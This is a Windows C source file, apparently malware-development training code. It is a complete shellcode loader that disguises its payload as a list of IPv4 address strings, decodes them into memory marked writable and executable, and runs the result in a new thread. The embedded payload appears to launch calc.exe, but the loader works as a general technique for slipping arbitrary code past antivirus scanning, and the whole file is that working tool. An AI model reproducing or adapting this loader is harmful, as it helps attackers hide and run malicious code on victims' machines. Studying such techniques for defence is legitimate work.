#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "Ntdll.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


#endif
typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
	PCSTR		S,
	BOOLEAN		Strict,
	PCSTR* Terminator,
	PVOID		Addr
	);


//the size and ElementsNumber printed to the screen, which is:
#define ElementsNumber 69
#define SizeOfShellcode 276

//the Ipv4Array array printed to the screen, which is:
const char* Ipv4Array[] = {
"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237", "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139", "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0" };


BOOL DecodeIPv4Fuscation(const char* IPV4[], PVOID LpBaseAddress) {


	PCSTR Terminator = NULL;
	PVOID LpBaseAddress2 = NULL;
	NTSTATUS STATUS;

	// Getting RtlIpv4StringToAddressA address from ntdll.dll
	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Loop through all the IPv4 addresses saved in Ipv4Array

	int i = 0;
	for (int j = 0; j < ElementsNumber; j++) {

		// Deobfuscating one IPv4 address at a time
		// Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
		LpBaseAddress2 = (ULONG_PTR)LpBaseAddress + i;
		STATUS = pRtlIpv4StringToAddressA((PCSTR)IPV4[j], FALSE, &Terminator, LpBaseAddress2);
		if (!NT_SUCCESS(STATUS)) {
			printf("[!] RtlIpv6StringToAddressA failed for %s result %x", IPV4[j], STATUS);
			return FALSE;
		}
		else {
			i = i + 4;
		}
	}
	return TRUE;
}

int main() {

	PVOID LpBaseAddress = NULL;
	printf("[i] SizeOf IPv4Shell : %d \n", sizeof(Ipv4Array));

	// Allocating memory which will hold the deobfuscated shellcode
	LpBaseAddress = VirtualAllocEx(GetCurrentProcess(), NULL, SizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!LpBaseAddress) {
		printf("[!] VirtualAllocEx Failed With Error: %d \n", GetLastError());
		return -1;
	}
	printf("[+] LpBaseAddress: 0x%0-16p \n", (void*)LpBaseAddress);


	if (!DecodeIPv4Fuscation(Ipv4Array, LpBaseAddress)) {
		return -1;
	}

	printf("[+] Deobfuscated bytes at address %p of size  %d.\n", LpBaseAddress, SizeOfShellcode);

	// Print the deobfuscated shellcode
	printf("[+] Deobfuscated Shellcode:\n");
	PBYTE pShellcode = (PBYTE)LpBaseAddress;
	for (int i = 0; i < SizeOfShellcode; i++) {
		printf("%02X ", pShellcode[i]);
	}
	printf("\n");

	DWORD LpThreadId;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LpBaseAddress, NULL, NULL, &LpThreadId);

	printf("[+] hit Enter To Exit ... \n");
	getchar();
	VirtualFree(LpBaseAddress, SizeOfShellcode, MEM_DECOMMIT);
	return 0;

}
